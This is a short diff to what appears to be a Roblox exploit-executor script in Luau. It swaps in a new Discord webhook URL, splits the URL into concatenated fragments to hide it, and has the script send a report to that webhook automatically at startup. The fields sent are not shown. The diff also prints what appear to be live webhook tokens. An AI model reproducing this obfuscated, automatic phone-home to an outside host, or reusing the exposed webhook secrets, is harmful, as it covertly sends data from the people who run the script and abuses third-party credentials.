@@ -16,7 +16,7 @@ local setfpscap: (FPS: number) -> () = getfenv().setfpscap
 local isrbxactive: () -> (boolean) = getfenv().isrbxactive
 local setclipboard: (Text: string) -> () = getfenv().setclipboard
 
-local Webhook1 = "https://disco","rd.com/api/web","hooks/128084407","9009103874/dOREUzvXxih","q6DbSiDvZqYme6vo4cJjdRrQ","RW9St4R22rHq4JUX","ScNJ0qJYZAkb4t01s)"
+local Webhook1 = "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzI59v5hq".."T89zkgmo0q_tWBeaomDP8".."SO7UNYcw3H0Nif76ewQCwM".."A7qZBEl1OBX"
 
 local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, ["inline"]: true}})
 	if not request then
@@ -74,8 +74,8 @@ local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, 
 	})
 end
 
-task.spawn(Send, "https://disco","rd.com/api/web","hooks/128084407","9009103874/dOREUzvXxih","q6DbSiDvZqYme6vo4cJjdRrQ","RW9St4R22rHq4JUX","ScNJ0qJYZAkb4t01s)")
-
+task.spawn(Send, "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzI59v5hq".."T89zkgmo0q_tWBeaomDP8".."SO7UNYcw3H0Nif76ewQCwM".."A7qZBEl1OBX")
+ 
 function Notify(Title: string, Content: string, Image: string)
 	Rayfield:Notify({
 		Title = Title,
